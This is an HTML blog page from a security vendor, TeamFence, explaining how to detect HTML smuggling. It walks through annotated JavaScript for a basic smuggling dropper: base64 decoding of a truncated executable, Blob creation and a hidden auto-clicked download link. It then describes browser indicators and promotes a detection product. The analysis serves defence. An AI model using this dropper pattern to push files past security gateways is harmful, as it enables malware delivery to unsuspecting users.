@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zxx" class="js"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="author" content="Softnio">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    
+    <link rel="shortcut icon" href="/images/favicon.png">
+    
+    <title>TeamFence</title>
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href='/css/vendor.bundle.min.css?ver=210'>
+    <link rel="stylesheet" href='/css/style-lungwort.min.css?ver=210'>
+    
+    <link rel="stylesheet" href='/css/theme.min.css?ver=210'>
+    <link rel="stylesheet" href='/css/custom.min.css?ver=210'>
+</head>
+<body class="nk-body body-wider theme-dark mode-onepage">
+<div class="nk-wrap">
+    <header class="nk-header page-header is-transparent is-sticky is-shrink is-dark" id="header">
+        
+
+<div class="header-main">
+    <div class="header-container container">
+        <div class="header-wrap">
+            
+            <div class="header-logo logo animated" data-animate="fadeInDown" data-delay=".65">
+                <a href="/" class="logo-link">
+                    <img class="logo-dark" src="/images/logo.png" srcset="/images/logo.png" alt="logo">
+                    <img class="logo-light" src="/images/logo-white.png" srcset="/images/logo-white.png" alt="logo">
+                </a>
+            </div>
+            
+            <div class="header-nav-toggle">
+                <a href="/" class="navbar-toggle" data-menu-toggle="example-menu-04">
+                    <div class="toggle-line">
+                        <span></span>
+                    </div>
+                </a>
+            </div>
+            
+            <div class="header-navbar header-navbar-s1">
+                <nav class="header-menu" id="example-menu-04">
+                    <ul class="menu menu-s2 animated" data-animate="fadeInDown" data-delay=".75">
+                        
+                        <li class="menu-item">
+                            <a class="menu-link nav-link" href="/fr/">Accueil</a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="menu-link nav-link" href="/fr/#services">Services</a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="menu-link nav-link" href="/fr/#about">Entreprise</a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="menu-link nav-link" href="/fr/blog/">Blog</a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="menu-link nav-link" href="/fr/about/">À propos</a>
+                        </li>
+                        
+                    </ul>
+                    <ul class="menu-btns animated" data-animate="fadeInDown" data-delay=".85">
+                        <li><a href="#contact" class="btn btn-rg btn-auto btn-outline btn-grad on-bg-theme btn-round">
+                            <span>Contactez-nous</span></a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+</div>
+
+        <div class="header-banner bg-purple">
+            <div class="nk-ovm shape-a-sm"></div>
+        </div>
+        
+    </header>
+    <main class="nk-pages">
+        <section class="section bg-purple">
+            <div class="container" style="margin-top: -50px">
+                <div class="nk-block nk-block-blog">
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="blog-details">
+                                <div class="row justify-content-center">
+                                    <div class="col-xl-8 col-lg-10">
+                                        <ul class="blog-meta text-white"> 
+                                            <li><a class="text-white" href="#">June 21, 2024</a></li> 
+                                            <li><a class="text-white" href="#">5  minutes  read</a></li> 
+                                        </ul>
+                                        <div class="blog-content">
+                                            <h2 class="title text-white"><a href="#">HTML Smuggling Detection</a></h2>
+                                            <div class="col-xl-10 col-lg-12">
+                                                <div class="blog-featured">
+                                                    <div class="img-wrapper-single">
+                                                        <div class="box box1" id="img-container">
+                                                            <img class="round post-image" src="/posts/html-smuggling/static/html-smuggling.png" alt="featured">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="text-white"> 
+                                                <h2 id="introduction">Introduction</h2>
+<p>HTML smuggling is an advanced and stealthy tactic that leverages standard HTML5 and JavaScript features to avoid
+detection and deliver Remote Access Trojans (RATs), banking malware, and other harmful software. This method is
+increasingly being adopted by state-sponsored hacking groups and cybercriminals to infiltrate governments, individuals,
+and businesses. One notable example is the NOBELIUM group, believed to have links to Russia, which has used HTML
+smuggling to target government and diplomatic organizations worldwide. Microsoft researchers have observed that the
+NOBELIUM group employed malicious HTML attachments in a campaign dubbed EnvyScout. These attachments act as droppers,
+capable of de-obfuscating and writing malicious ISO files to the victim&rsquo;s system.</p>
+<h2 id="how-html-smuggling-works">How HTML Smuggling Works</h2>
+<p>This malware is essentially used to gain control of victim machines, effectively deliver payloads, and execute
+ransomware attacks.</p>
+<p>In HTML smuggling, the attacker uses a specially crafted HTML attachment that carries an encoded malicious script. When
+the victim opens this malicious HTML file in their web browser, the browser decodes this embedded malicious script which
+on execution further assembles the payload on the victim machine. The main advantage to threat actors is that instead of
+passing the payload over the network, the malicious payload assembles on the victim’s machine. This makes the technique
+highly evasive because it could bypass standard security controls like web proxies, firewalls, and email gateways. As
+the payload is only created when the malicious HTML file is loaded on the victim’s machine through the web browser, the
+security solutions only see HTML or JavaScript traffic which can be further obfuscated to evade detection.</p>
+<!-- raw HTML omitted -->
+<h2 id="code-analysis">Code analysis</h2>
+<p>In this chapter we are going to analise a basic version of a html smuggling
+payload. <a href="https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript.md">see the full code</a></p>
+<h4 id="base64-encoded-data">Base64 encoded data</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">//convert function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">base64ToArrayBuffer</span>(<span style="color:#a6e22e">base64</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">binary_string</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">base64</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">binary_string</span>.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bytes</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">len</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">len</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bytes</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">binary_string</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">buffer</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//malware.exe encoded in Base64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;TVqQAAMAAAAEAAAA//8AALgAA[...]nBkYgA=&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64ToArrayBuffer</span>(<span style="color:#a6e22e">file</span>);
+</span></span></code></pre></div><p>As we observed, the malicious HTML file can deliver malware to the victim&rsquo;s machine through various methods. In this
+scenario, the entire malware payload is encoded in base64 and embedded directly within the HTML file itself.
+We can see the variable <code>file</code> containing the payload.</p>
+<p>The function <code>base64ToArrayBuffer</code> converts the encoded payload into the actual bytes that make up the malicious file.</p>
+<p>It is important to note that attackers can devise even more complex methods to deliver malware. For instance, they might
+split the payload into several pieces, retrieve parts of it remotely, or use different encoding standards and encryption
+techniques. These strategies significantly increase the likelihood of evading security measures such as web proxies,
+firewalls, and email gateways.</p>
+<h4 id="javascript-blob">JavaScript Blob</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">blob</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([<span style="color:#a6e22e">data</span>], {<span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;octet/stream&#39;</span>});
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fileName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;evil.exe&#39;</span>;
+</span></span></code></pre></div><p>This is the core of the attack. The Blob object enables the creation of a file within the browser using JavaScript code.
+Here is how Mozilla describes it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;The Blob interface represents a blob, which is a file-like object of immutable, raw data; they can be read as text or
+</span></span><span style="display:flex;"><span>binary data, or converted into a ReadableStream so its methods can be used for processing the data.
+</span></span><span style="display:flex;"><span>Blobs can represent data that isn&#39;t necessarily in a JavaScript-native format. The File interface is based on Blob,
+</span></span><span style="display:flex;"><span>inheriting blob functionality and expanding it to support files on the user&#39;s system.&#34;
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h4 id="html-anchor-download">HTML anchor download</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">msSaveOrOpenBlob</span>) {
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">msSaveOrOpenBlob</span>(<span style="color:#a6e22e">blob</span>, <span style="color:#a6e22e">fileName</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;a&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span>);
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">a</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">style</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;display: none&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">createObjectURL</span>(<span style="color:#a6e22e">blob</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">url</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">download</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fileName</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">click</span>();
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">revokeObjectURL</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This code snippet checks if the browser supports <code>msSaveOrOpenBlob</code>. If supported (for older versions of Internet
+Explorer
+and Microsoft Edge), it uses it to save or open a Blob object (blob) with a specified file name (fileName). If not
+supported, it creates a hidden <!-- raw HTML omitted --> element in the document, sets up a Blob URL (url) for the Blob object (blob), assigns
+the URL to the <!-- raw HTML omitted --> element&rsquo;s href attribute, sets the download attribute to specify the file name (fileName), simulates
+a click on the <!-- raw HTML omitted --> element to trigger the download, and cleans up by revoking the Blob URL (url).</p>
+<p>At this point the malicious file is stored on the victim&rsquo;s machine.</p>
+<h3 id="behaviour-on-browser">Behaviour on browser</h3>
+<p>Now it is easy to imagine the numerous ways an attacker can devise to pull a malicious file and reconstruct it directly
+on the victim&rsquo;s machine. We can view this stage as a high-level operation where the attacker manipulates encoding,
+strings, and various remote and embedded resources. However, at a certain point, they must utilize specific browser
+APIs (low-level operation)
+to execute the attack. This is where we can intervene and take action!</p>
+<h4 id="browser-level-iocs">Browser level IOCs</h4>
+<p>Every technique leaves traces, and in this case, our Indicators of Compromise (IOCs) are provided by the event of Blob
+creation.
+This event has several parameters and options, the most interesting of which are the ArrayBuffer, containing the
+malware, and the type, which must be set to octet/stream.</p>
+<!-- raw HTML omitted -->
+<p>After this, an anchor element is created that points to a Blob URL with a download parameter and probably with
+a <code>display:none</code> style, followed by a programmatic click on it. This
+sequence of actions represents another specific behavior that can be identified and monitored for malicious activity.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;blob:null/5f2c2f2a-0349-43d2-a6ec-276bd4efb082&#34;</span> <span style="color:#a6e22e">download</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;evil.exe&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display: none;&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>In conclusion, HTML smuggling represents a sophisticated method utilized by cyber adversaries to circumvent traditional
+security measures and deliver malicious payloads directly to unsuspecting users. By embedding encoded scripts within
+innocuous-looking HTML files, attackers can evade detection and execute harmful actions on victim machines. This
+technique poses significant risks to individuals, businesses, and governments worldwide.</p>
+<p>At TeamFence, we have conducted extensive analysis of HTML smuggling techniques and understand the critical importance
+of proactive defense measures. Our solution is designed to detect and mitigate these stealthy attacks effectively. By
+leveraging advanced detection algorithms and real-time monitoring capabilities, BrowserFence identifies suspicious
+behaviors associated with HTML smuggling, such as the creation and manipulation of Blob URLs and the assembly of
+malicious payloads in memory.</p>
+<p>Protect your organization today with BrowserFence and stay ahead in the ever-evolving landscape of cybersecurity threats.
+Contact us to learn more about how BrowserFence can defend your digital assets against HTML smuggling and ensure a secure
+computing environment for your business.</p>
+<!-- raw HTML omitted -->
+
+                                            </div>
+                                        </div>
+                                        <ul class="blog-tags text-white"> 
+                                            
+                                            
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+    
+    <div class="preloader preloader-alt no-split">
+        <span class="spinner spinner-alt">
+            <img class="spinner-brand" src="/images/logo-white.png" alt="">
+        </span>
+    </div>
+    
+
+
+
+
+
+<script defer  src='/js/jquery.bundle.min.5982afc908c46b2144b576a651c29adc72bf2dfa9685a00c7dd16b77aba777a4d1c66ba9fe480a81bc42cc40879d8d16d3660e1ff7e0b6e9ca1f4b78d11ebbab.js?ver=210'></script>
+<script defer  src='/js/scripts.min.810c4e3229f07102e6da786e19bada1559816724bfcb53aaffc206384b0935134d42df8a0048ea62bbe01e23993b85f12897baf4e45862d5e767c65a878cbd61.js?ver=210'></script>
+<script defer  src='/js/charts.min.233bec70385379d36087ce327911a0880e9f24394a47f3ac96262f2ab5ec6e6abcd23516c1250b6b9686a39298686089a91247237a53dfcdc082554f810b8cad.js?ver=210'></script>
+<script defer  src='/js/toastr.examples.min.8db0f69b90e47bd433705b43acc2ffcc16aeaa78f06edd02fdc97e67abad460d09fe0135f2e92bc5b30ad986d87467ca3e33d470592d4c1d181554fdd8791fc6.js?ver=210'></script>
+<section id="footer">
+    <footer class="nk-footer bg-theme-dark">
+        <div class="tc-light">
+            <div class="container">
+                <div class="nk-block">
+                    <div class="bg-theme-accent-alt round subscribe-wrap animated" data-animate="fadeInUp" data-delay=".1">
+                        <div class="row text-center text-md-start justify-content-center align-items-center gutter-vr-25px">
+                            <div class="col-lg-6">
+                                <div class="wide-auto-sm">
+                                    <h4 class="title-sm">Ne manquez rien, restez informé</h4>
+                                    <p>Inscrivez-vous aux mises à jour et aux nouvelles du marché. Abonnez-vous à notre newsletter et recevez des mises à jour sur TeamFence.</p>
+                                </div>
+                            </div>
+                            <div class="col-lg-6">
+                                <div class="gap-3x d-none d-lg-block"></div>
+                                <form action="https://formspree.io/f/meojgrqj" class="nk-form-submit" method="post">
+                                    <div class="field-inline field-inline-s2 field-inline-s2-sm bg-white shadow-soft">
+                                        <div class="field-wrap">
+                                            <input class="input-solid input-solid-md required email" type="email" name="email" placeholder="Your email" required>
+                                            <input type="text" class="d-none" name="_gotcha" style="display:none">
+                                        </div>
+                                        <div class="submit-wrap">
+                                            <button type="submit" class="btn btn-md btn-grad">S&#39;abonner</button>
+                                        </div>
+                                    </div>
+                                    <div class="form-results" id="form-results" style="display: none;"></div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="space-to-color" class="nk-ovm ovm-top ovm-h-50 bg-theme-alt"></div>
+        </div>
+        <div class="section section-footer section-m tc-light bg-transparent ov-h">
+            <div class="container">
+                <div class="nk-block block-footer">
+                    <div class="row">
+                        <div class="col">
+                            <div class="wgs wgs-text text-center mb-3">
+                                <ul class="social pdb-l justify-content-center">
+                                    <li><a href="#"><em class="social-icon fab fa-facebook-f"></em></a></li>
+                                    <li><a href="#"><em class="social-icon fab fa-twitter"></em></a></li>
+                                    <li><a href="#"><em class="social-icon fab fa-youtube"></em></a></li>
+                                    <li><a href="#"><em class="social-icon fab fa-github"></em></a></li>
+                                    <li><a href="#"><em class="social-icon fab fa-bitcoin"></em></a></li>
+                                    <li><a href="#"><em class="social-icon fab fa-medium-m"></em></a></li>
+                                </ul>
+                                <a href="./" class="footer-logo">
+                                    <img src="/images/logo-white.png" srcset="/images/logo-white.png" alt="logo" style="width: 25%">
+                                </a>
+                                <div class="copyright-text copyright-text-s3 pdt-m">
+                                    <p><span class="d-sm-block">Copyright © 2024, TeamFence sagl CHE-197.469.909<br>Viale Castagnola 27, 6900 Lugano</span></p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="nk-ovm shape-s"></div>
+        </div>
+    </footer>
+</section>
+</div>
+</body>
+</html>
